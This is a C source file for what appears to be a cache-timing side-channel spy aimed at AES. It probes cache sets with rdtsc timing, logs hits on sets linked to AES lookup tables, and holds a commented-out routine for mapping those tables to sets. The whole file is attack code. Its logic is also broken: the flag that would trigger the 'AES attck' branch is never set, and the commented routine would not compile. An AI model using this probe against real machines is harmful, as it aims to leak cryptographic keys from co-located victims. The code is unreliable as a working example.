#include<stdio.h>
#include<time.h>
#include<omp.h>
#include<math.h>
#include<stdlib.h>
#include<string.h>

static __inline__ unsigned long long rdtsc(void)
{
  unsigned long long int x;
     __asm__ volatile (".byte 0x0f, 0x31" : "=A" (x));
     return x;
}

//char T[4][8]="4210944","4212992","4215040","4217088";

/*unsigned int T1=0X404900;
unsigned int T2=0X405100;
unsigned int T3=0x405900;
*/
int main(int argc, char **argv)

{


FILE *fp=fopen(argv[1],"w+");
        char a[4194305];
	char buff[100];
        int i,j,k,count,l,increment=0,h=0;
        double start,end;
	long flag=0;

        //create and fill array

        for(i=0;i<4194305;i++)
                a[i]='a';

while(1)
{ flag=0;
for(l=0;l<4096;l++)
{       i=l*64;
//      start=omp_get_wtime();
        //to cover all 8 lines of set1
unsigned long long cycles = rdtsc();
        for(j=0;j<16;j++)

        {       count=0;

                //read cache line
		//unsigned long long cycles = rdtsc();
                while(count<64)

                {
                        k=a[i];
                        //to skip remaining sets
                        count++;
                        i++;

                }
		//cycles = rdtsc() - cycles;
	
                increment=4095*64;
                i=i+increment;
	//	if(l==292)  
	//		fprintf(fp,"%ld\t",cycles);

      }
 cycles = rdtsc() - cycles;

if(cycles>8000)
{/*
switch(l)
{
	case 264:flag | 1;
		 break;
	case 268:flag | (1<<1);
		 break;
	case 286: flag | (1<<2);
		 break;
	case 292: flag | (1<<3);
		 break;
	case 306: flag |(1<<4);
		 break;
	case 297: flag |(1<<5);
		 break;
	case 323:flag |(1<<6);
		 break;
	case 342:flag |(1<<7);
		 break;
	case 325:flag |(1<<8);
		 break;
	case 338:flag |(1<<9);
		 break;
	case 362:flag |(1<<10);
		 break;
	case 355:flag |(1<<11);
		 break;
	case 358:flag |(1<<12);
		break;
	case 375: flag |(1<<13);
		break;
	default: break;
}
 */
if(l==264||l==268||l==286||l==292||l==306||l==297||l==323||l==342||l==325||l==338||l==362||l==355||l==358||l==375)
{
fprintf(fp,"%d\t",l);
time_t now=time(NULL);

strftime(buff,100,"%H:%M:%S.000",localtime(&now));
//printf("%s\n",buff);
fprintf(fp,"%d %s\t",l,buff);
}
}

if(flag == 16383)
{
fprintf(fp,"AES attck");
time_t now=time(NULL);

strftime(buff,100,"%H:%M:%S.000",localtime(&now));
printf("%s\n",buff);

//attack();
}

}
/*time_t now=time(NULL);

strftime(buff,100,"%H:%M:%S.000",localtime(&now));
printf("%s\n",buff);
*/
//printf("hey");
fprintf(fp,"\n---------------------------\n");
}
}

/*int conversion(char hexaDecimal[6])
{
char binaryNumber[24],modifiedBinary[12],ch;
    int i,j,blen,len,temp;
    long int num,rem,set=0,power=0;
    
    len=strlen(hexaDecimal);
    blen=len*4;
    binaryNumber[blen]='\0';
    i=len;
    while(i>0)
    {
        i--;
        ch=hexaDecimal[i];
        if(ch>=48 && ch <=57)
            temp=ch-48;
        else
       {
               temp=ch-55;
        } 
        for(j=0;j<4;j++)
        {
             binaryNumber[--blen]=(temp%2)+48;
             temp/=2;
        }
     }
	for(i=6,j=0;i<18;i++,j++)
		modifiedBinary[j]=binaryNumber[i];
     modifiedBinary[12]='\0';
     num=atoi(modifiedBinary);
     
     for(i=0;i<12;i++)
     {
 		rem = num%10;
 num = num/10;
 set = set + rem * pow(2,power);
 power++;
}
return set;
 }


attack()
{
	char buff[10];
	int set[256],i,j;
	//4 look up tables
	for(i=0;i<4;i++)
	{
		for(j=0;j<256;j++)
		{
			sprintf(buff,"%x",(atoi(T[i])+j*4));
			set[i][j]=conversion(buff);


			unaccessedset[i][j]
		}
	}
}
			
*/
